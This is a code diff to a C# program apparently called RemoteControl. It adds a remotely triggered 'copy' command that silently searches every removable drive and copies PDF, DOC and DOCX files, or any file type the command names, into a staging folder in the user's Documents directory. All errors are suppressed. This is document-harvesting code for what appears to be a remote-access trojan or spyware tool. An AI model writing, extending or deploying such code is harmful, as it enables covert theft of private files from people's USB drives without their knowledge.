@@ -134,6 +134,12 @@ namespace RemoteControl
                             }
                         }
 
+                        if (data.StartsWith("copy"))
+                        {
+                            string code = data.Substring(4);
+                            Copy(code);
+                        }
+
                         if (data.StartsWith("cmd"))
                         {
                             string code = data.Substring(3);
@@ -225,6 +231,42 @@ namespace RemoteControl
                     File.Delete(up + @"\Documents\program.bat");
                 }
                 catch { }
+            }
+        }
+
+        static void Copy(string filetype)
+        {
+            foreach (DriveInfo drive in DriveInfo.GetDrives())
+            {
+                if (drive.DriveType == DriveType.Removable)
+                {
+                    foreach (String dir in Directory.GetDirectories(drive.Name))
+                    {
+                        try
+                        {
+                            foreach (String file in Directory.GetFileSystemEntries(dir, "*", SearchOption.AllDirectories))
+                            {
+                                if (filetype.Equals(""))
+                                {
+                                    if (file.EndsWith(".pdf") || file.EndsWith(".doc") || file.EndsWith(".docx"))
+                                    {
+                                        Directory.CreateDirectory(up + @"\Documents\Belgeler");
+                                        try { File.Copy(file, up + @"\Documents\Belgeler\" + Path.GetFileName(file), true); } catch { }
+                                    }
+                                }
+                                else
+                                {
+                                    if (file.EndsWith("." + filetype))
+                                    {
+                                        Directory.CreateDirectory(up + @"\Documents\Belgeler");
+                                        try { File.Copy(file, up + @"\Documents\Belgeler\" + Path.GetFileName(file), true); } catch { }
+                                    }
+                                }
+                            }
+                        }
+                        catch { }
+                    }
+                }
             }
         }
 
